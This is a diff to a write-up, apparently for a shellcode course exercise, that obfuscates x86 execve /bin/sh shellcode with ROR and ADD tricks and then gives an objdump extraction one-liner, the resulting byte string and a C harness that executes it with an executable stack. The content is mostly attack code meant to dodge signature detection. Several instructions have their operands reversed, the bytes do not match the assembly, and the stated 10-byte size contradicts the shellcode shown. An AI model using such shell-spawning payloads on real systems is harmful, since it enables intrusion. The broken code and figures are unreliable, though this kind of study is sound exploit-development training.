@@ -32,26 +32,25 @@ global _start
 
 section .text
 
-_start: 
+_start:
 
-xor    eax, eax      ; zero out eax
+xor    eax, eax      ; zero our eax
 push   eax
 
 ; push   0x68732f2f
 
 mov eax, 0xd0e65e5e
-ror eax, 1			 ; shift the register by 1 ro right
+ror eax, 1                       ; shift the register by 1 ro right
 push eax
 
 ; push   0x6e69622f
-push eax, 0xdcd2c45e
-ror eax, 1			 ; shift the register by 1 ro right
+add eax, 0x5f63300               ; add 5f63300 to eax register to push 6e69622f                                       
 push eax
 
 mov    esp,ebx
 mov    eax,ecx
 mov    eax,edx
-mov    0xb,al
+mov    al,0xb
 int    0x80
 
 ; End section for exit call
@@ -62,7 +61,39 @@ int    0x80
  
  Here I have done two few changes to the code : 
  
- 1) The eax register for both 0x68732f2f and 0x6e69622f are first brought to it's original form by first ROR the register by left.
+ 1) The eax register for both 0x68732f2f is first brought to it's original form by first ROR the register by left.
  2) For this research, I have used bit shift calculator and shifted the accumulator by 1.
  3) Use the same method, I have added ror by 1 to shift the register back to it's original form to perform execve.
+ 4) Next, I have added 5f63300 to the accumulated eax to achieve 6e69622f instead of directly pushing it to the register.
+ 
+ Compile the code using the "./compile.sh execve-modified".
+ 
+ Use the following objdump to retrieve the shellcode of the nasm file.
+  ```
+ objdump -d ./execve-modified|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+  ```
+  
+shellcode : "\x31\xc0\x50\xb8\x5e\x5e\xe6\xd0\xd1\xc8\x50\x05\x00\x33\xf6\x05\x50\x89\xdc\x89\xc8\x89\xd0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 
+Now copy the obtained shellcode and provide it in the shellcode.c 
+ ```
+ #include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x31\xc0\x50\xb8\x5e\x5e\xe6\xd0\xd1\xc8\x50\x05\x00\x33\xf6\x05\x50\x89\xdc\x89\xc8\x89\xd0\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+
+int main()
+{
+
+        printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+  ```
+
+Compiling the shellcode using -z execstack ( gcc -fno-stack-protector -z execstack ) and running the shellcode file,
+the size is : 10 bytes
